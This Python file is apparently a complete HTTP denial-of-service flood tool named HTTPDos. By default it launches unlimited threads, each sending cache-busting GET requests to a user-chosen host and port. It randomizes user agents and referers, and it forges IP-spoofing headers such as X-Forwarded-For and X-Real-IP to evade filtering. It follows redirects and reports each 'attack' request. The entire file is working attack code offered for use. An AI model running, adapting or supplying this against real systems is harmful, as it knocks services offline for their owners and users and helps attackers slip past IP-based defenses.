from fake_useragent import UserAgent
import random
import socket
import ssl
import argparse
import ipaddress
import sys
import threading

class HTTPDos:
    def __init__(self, args):
        self.user_agent_generator = UserAgent()
        self.host = args.host
        self.port = args.port
        self.path = args.path if args.path else f"?{random.randint(0, 9999999)}"
        self.ssl_value = self.check_ssl()
        self.max_threads = args.threads
        self.cookie = args.cookie 
        self.stop_event = threading.Event()
        self.start_attack()

    def user_agent(self):
        """Return a random user agent string."""
        return self.user_agent_generator.random

    def generate_ips(self):
        """Generate five random IP addresses from predefined subnets."""
        subnets = [
            "10.10.1.0/24",
            "10.10.10.0/24",
            "192.168.1.0/24",
            "192.168.0.0/24",
            "172.16.0.0/24"
        ]
        ips = ['127.0.0.1'] + [
            str(random.choice(list(ipaddress.ip_network(subnet, strict=False).hosts())))
            for subnet in subnets
        ]
        return ', '.join(ips)
    
    def generate_referer(self):
        """Generate a random referer from a text file."""
        try:
            with open('files/referer.txt', 'r') as file:
                referers = [line.strip() for line in file if line.strip()]
            return random.choice(referers)
        except FileNotFoundError:
            print("[-] referers.txt file not found.")
            return None
        except Exception as e:
            print(f"[-] An error occurred while reading the referers file: {str(e)}")
            return None

    def header(self):
        """Construct the HTTP header."""
        headers = [
            f"GET /{self.path} HTTP/1.1\r\n",
            f"Host: {self.host}\r\n",
            f"User-Agent: {self.user_agent()}\r\n",
            "Accept: */*\r\n",
            "Accept-Encoding: */*\r\n",
            "Accept-Language: */*\r\n",
            "Cache-Control: no-cache\r\n",
            "Client-IP: 127.0.0.1\r\n",
            "Connection: Keep-Alive\r\n",
            "Pragma: no-cache\r\n",
            f"Referer: {self.generate_referer()}\r\n"
            "Sec-Fetch-Dest: document\r\n"
            "Sec-Fetch-Mode: navigate\r\n"
            "Sec-Fetch-Site: none\r\n"
            "Sec-Fetch-User: ?1\r\n"
            "Sec-Gpc: 1\r\n",
            'Upgrade-Insecure-Requests: 1\r\n'
            f"X-a: {random.randint(0, 9999999)}\r\n",
            f"X-Forwarded-For: {self.generate_ips()}\r\n",
            "X-Originating-IP: 127.0.0.1\r\n",
            "X-ProxyUser-ip: 127.0.0.1\r\n",
            "X-Real-IP: 127.0.0.1\r\n",
            "X-Remote-Addr: 127.0.0.1\r\n",
            "X-Remote-IP: 127.0.0.1\r\n",
        ]
        
        if self.cookie:
            headers.append(f"Cookie: {self.cookie}\r\n")
        
        headers.append("\r\n")
        return ''.join(headers)

    def check_ssl(self):
        """Check if the target host and port support SSL."""
        try:
            sock = socket.create_connection((self.host, self.port), timeout=5)
            context = ssl.create_default_context()
            with context.wrap_socket(sock, server_hostname=self.host) as ssl_sock:
                ssl_sock.do_handshake()
            return True
        except (ssl.SSLError, socket.error):
            return False

    def connection(self):
        """Create a socket connection and send the header."""
        s = None
        try:
            if self.path.startswith("?"):
                self.path = f"?{random.randint(0, 9999999)}"

            if self.ssl_value:
                context = ssl.create_default_context()
                s = context.wrap_socket(socket.socket(socket.AF_INET, socket.SOCK_STREAM), server_hostname=self.host)
            else:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            s.connect((self.host, self.port))
            s.send(self.header().encode())
            response = s.recv(4096)  
            self.handle_response(response.decode('utf-8', errors='replace'))
        except ssl.SSLError as e:
            print(f"[-] SSL Error: {str(e)}")
        except socket.timeout:
            print(f"[-] Connection to {self.host}:{self.port} timed out.")
        except socket.error as e:
            print(f"[-] Socket error: {str(e)}")
        except Exception as e:
            print(f"[-] Network Error: {str(e)}")
        finally:
            if s is not None:
                s.close()

    def handle_response(self, response):
        """Handle the HTTP response and check for redirects."""
        status_line = response.split('\r\n')[0]
        status_code = status_line.split(' ')[1] if len(status_line.split(' ')) > 1 else None

        if status_code in ["301", "302"]:
            print("[!] Redirect detected.")
            location_line = next((line for line in response.split('\r\n') if "Location:" in line), None)
            if location_line:
                redirect_url = location_line.split("Location: ")[1].strip()
                url_parts = redirect_url.split("/")
                if len(url_parts) > 2:
                    new_host = url_parts[2]
                    new_path = '/'.join(url_parts[3:]) if len(url_parts) > 3 else self.path
                    print(f"[!] Redirecting to {new_host} with path {new_path}.")
                    self.host = new_host
                    self.path = new_path
                    self.connection()
        elif status_code == "403":
            print("[!] 403 Forbidden detected. Stopping all threads.")
            self.stop_event.set() 
        else:
            print(f"[+] Attacking Host -> {self.host} | Path -> {self.path} | Port -> {self.port} | Status Code -> {status_code}")

    def start_attack(self):
        """Start the attack by continuously creating threads for sending requests."""
        try:
            while not self.stop_event.is_set():
                if threading.active_count() <= self.max_threads:
                    threading.Thread(target=self.connection, daemon=True).start()
        except KeyboardInterrupt:
            print("\n[!] Attack stopped by user.")
            self.stop_event.set()

        for thread in threading.enumerate():
            if thread is not threading.main_thread():
                thread.join()
        print("[!] All threads have been stopped.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="HTTPDos: A tool for simulating HTTP Denial of Service attacks.")
    parser.add_argument("-H", "--host", required=True, help="Target Host")
    parser.add_argument("-P", "--port", type=int, required=True, help="Target Port")
    parser.add_argument("-p", "--path", help="Target Path (Optional)")
    parser.add_argument("-t", "--threads", type=int, default=sys.maxsize, help="Maximum number of concurrent threads (default: unlimited)")
    parser.add_argument("-c", "--cookie", help="Session Cookie (Optional)")

    args = parser.parse_args()
    HTTPDos(args)
